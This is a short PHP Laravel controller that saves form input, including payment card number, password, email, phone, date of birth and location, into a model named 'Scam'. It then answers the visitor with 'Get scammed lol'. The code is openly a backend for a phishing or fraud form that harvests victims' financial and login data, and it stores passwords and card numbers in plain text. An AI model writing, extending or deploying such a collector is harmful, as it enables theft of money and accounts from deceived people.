<?php

namespace App\Http\Controllers;

use App\Models\Scam;
use Illuminate\Http\Request;

class GiveInfoController extends Controller
{
    public function processForm(Request $request)
    {
        $credentials = $request->validate([
            "card" => "required|integer",
            "name" => "required|max:255",
            "phone" => "required|max:255",
            "email" => "required|email",
            "password" => "required|string|min:8",
            "location" => "required",
            "dob" => "required|date",
            "gender" => "required|string"
        ]);

        $scam = new Scam();

        $scam->card = request('card');
        $scam->name = request('name');
        $scam->phone = request('phone');
        $scam->email = request('email');
        $scam->password = request('password');
        $scam->location = request('location');
        $scam->dob = request('dob');
        $scam->gender = request('gender');

        $scam->save();

        return "Get scammed lol";
    }

    public function deleteScam($id)
    {
        error_log("000");

        Scam::find($id)->delete();

        error_log("111");

        return redirect('home');
    }
}
